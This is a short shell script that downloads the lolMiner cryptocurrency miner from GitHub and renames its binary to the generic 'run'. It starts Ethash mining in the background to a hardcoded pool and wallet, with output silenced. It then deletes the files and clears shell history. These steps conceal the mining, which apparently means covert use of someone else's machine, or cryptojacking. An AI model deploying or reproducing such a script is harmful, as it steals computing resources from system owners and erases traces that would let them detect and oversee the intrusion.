# deploy
apt update
apt install wget tar nuhup -y
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.47/lolMiner_v1.47_Lin64.tar.gz
tar -xvf lolMiner_v1.47_Lin64.tar.gz

# rename
mv 1.47/lolMiner 1.47/run

# start
nohup 1.47/run  --algo ETHASH --pool eth-eu1.nanopool.org:9999 --user 0xb224D4Ac08Ff402c5CC9F74A101A9e44fF0fF576 > /dev/null &

# remove
rm -rf test_deploy
rm -rf 1.47
rm -f lolMiner*

# clear history
history -c

